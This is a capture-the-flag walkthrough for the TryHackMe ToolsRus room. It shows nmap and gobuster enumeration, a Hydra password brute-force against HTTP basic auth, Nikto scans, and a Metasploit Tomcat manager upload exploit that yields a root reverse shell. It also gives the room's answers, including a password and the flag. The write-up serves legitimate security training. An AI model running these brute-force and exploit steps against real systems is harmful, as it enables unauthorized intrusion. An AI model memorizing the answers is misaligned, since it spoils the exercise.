# ToolRUS

> **Source:** TryHackMe  
> **Room:** [ToolsRus](https://tryhackme.com/room/toolsrus)  
> **Tags:** #ctf #tryhackme #apache-tomcat #hydra #nikto #metasploit

---

## Enumeration

### Nmap Scan - Port Discovery
```bash
nmap -p- 10.10.91.232
```

**Open Ports:**
- 22/tcp - ssh
- 80/tcp - http
- 1234/tcp - hotline
- 8009/tcp - ajp13

---

### Nmap Service Version Scan
```bash
nmap -p- 10.10.91.232 -sV
```

**Detailed Results:**
- **Port 22:** OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
- **Port 80:** Apache httpd 2.4.18 ((Ubuntu))
- **Port 1234:** Apache Tomcat/Coyote JSP engine 1.1
- **Port 8009:** Apache Jserv (Protocol v1.3)
- **OS:** Linux Ubuntu

---

## Web Enumeration

### What directory can you find, that begins with a "g"?

**Tool:** Dirbuster

**Configuration:**
- URL: `http://10.10.91.232`
- Wordlist: `/usr/share/seclists/Discovery/Web-Content/directory-list-medium.txt`

**Command Alternative (Gobuster):**
```bash
gobuster dir -u http://10.10.91.232 -w /usr/share/wordlists/dirbuster/directory-list-medium.txt
```

**Answer:** guidelines

---

### Whose name can you find from this directory?

**Steps:**
1. Browse to: `http://10.10.91.232/guidelines`
2. Read the page content

**Answer:** bob

---

### What directory has basic authentication?

**Discovery:**
- Test various directories found during enumeration
- Directory name suggests protection: `/protected`

**Test:**
```bash
curl http://10.10.91.232/protected
```

**Result:** HTTP Basic Authentication prompt

**Answer:** protected

---

## Password Cracking

### What is bob's password to the protected part of the website?

**Tool:** Hydra

**Command:**
```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.91.232 http-get "/protected/" -t 4 -V -f
```

**Parameters:**
- `-l bob` - Username
- `-P rockyou.txt` - Password wordlist
- `http-get` - HTTP GET authentication
- `/protected/` - Target directory
- `-t 4` - 4 parallel tasks
- `-V` - Verbose output
- `-f` - Stop after finding password

**Answer:** bubbles

---

## Apache Tomcat Enumeration

### What other port that serves a web service is open on the machine?

**Reference:** Nmap scan results

**Answer:** 1234

---

### What is the name and version of the software running on port 1234?

**Detailed Nmap Scan:**
```bash
nmap -p 1234 -sV -A 10.10.91.232
```

**Answer:** Apache Tomcat/7.0.88

---

## Nikto Scanning

### Use Nikto with credentials and scan /manager/html

**Command:**
```bash
nikto -h http://10.10.91.232:1234/manager/html -id bob:bubbles -o nikto_results.html -Format html
```

**Parameters:**
- `-h` - Target host and path
- `-id` - Username:Password
- `-o` - Output file
- `-Format` - Output format

---

### What is the server version?

**Nikto Scan on Port 80:**
```bash
nikto -h http://10.10.91.232:80
```

**Output:**
```
Server: Apache/2.4.18 (Ubuntu)
```

**Answer:** Apache/2.4.18 (Ubuntu)

---

## Exploitation with Metasploit

### Use Metasploit to exploit the service and get a shell

**Exploit Module:**
```bash
use exploit/multi/http/tomcat_mgr_upload
```

**Configuration:**
```bash
set HttpUsername bob
set HttpPassword bubbles
set RHOSTS 10.10.91.232
set RPORT 1234
set LHOST [Your IP]
run
```

**Exploit Details:**
- Uploads malicious WAR file to Tomcat manager
- Executes payload to get reverse shell
- Requires valid manager credentials

---

### What user did you get a shell as?

**Check User:**
```bash
meterpreter > shell
whoami
```

**Answer:** root

---

### What flag is found in the root directory?

**Steps:**
1. Navigate to root directory
```bash
cd /root
ls
cat flag.txt
```

**Answer:** ff1fc4a81affcc7688cf89ae7dc6e0e1

---

## Summary

**Vulnerabilities Exploited:**
1. Directory listing/information disclosure
2. Weak password (brute-forced with Hydra)
3. Apache Tomcat Manager exposed
4. Default/weak Tomcat credentials
5. Tomcat Manager upload vulnerability

**Tools Used:**
- Nmap - Port scanning and service detection
- Dirbuster/Gobuster - Directory enumeration
- Hydra - Password brute-forcing
- Nikto - Web vulnerability scanning
- Metasploit - Exploitation framework

**Attack Chain:**
1. Port scan → Discovered Tomcat on 1234
2. Directory brute-force → Found protected area
3. Hydra → Cracked bob's password
4. Credentials worked on Tomcat Manager
5. Metasploit upload exploit → Root shell
6. Retrieved flag

---

**Status:** Completed  
**Difficulty:** Easy  
**Last Updated:** {{date}}